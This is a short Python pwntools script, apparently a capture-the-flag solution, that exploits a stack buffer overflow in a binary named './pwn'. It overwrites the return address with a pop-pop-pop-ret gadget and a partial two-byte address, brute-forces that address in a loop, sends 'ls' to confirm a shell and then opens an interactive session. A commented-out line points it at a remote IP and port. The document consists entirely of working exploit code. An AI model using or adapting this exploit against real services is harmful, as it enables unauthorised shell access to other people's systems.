from pwn import *

#sh = gdb.debug('./pwn', 'b *0x80484ac')
e = ELF('./pwn')
#context.log_level='debug'

_str_addr = e.symbols['str']

_pop_pop_pop_ret_addr = 0x8048529

payload = b'a'*(0x12+4)+p32(_pop_pop_pop_ret_addr)+b'a'*4*3+p16(0xbd3)

#sh.sendline(payload)
#sh.interactive()


for i in range(0x1000):
    try:

#        sh = remote('139.9.251.90', 9999)
        sh = process('./pwn', timeout=2)
        sh.sendline(payload)

        sh.sendline('ls')
        sh.sendline('ls')
        data = sh.recv()

        print(data)

        sh.interactive()
        sh.close()

    except Exception:
        sh.close()
        continue


